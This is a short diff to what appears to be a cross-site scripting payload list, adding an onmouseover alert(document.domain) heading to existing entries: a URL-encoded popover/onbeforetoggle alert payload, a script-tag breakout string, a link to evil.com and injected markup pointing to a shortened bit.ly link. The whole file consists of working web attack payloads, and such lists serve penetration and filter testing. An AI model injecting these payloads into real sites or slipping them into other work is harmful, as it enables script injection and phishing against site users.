@@ -1,4 +1,5 @@
 <button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
+<h1 onmouseover="alert(document.domain)">Click here</h1>
 #"><script>alert('XSS')</script>
 <a href="evil.com">Please click</a>
 <h1><a href=bit.ly/48rQIVc>Click<hr>
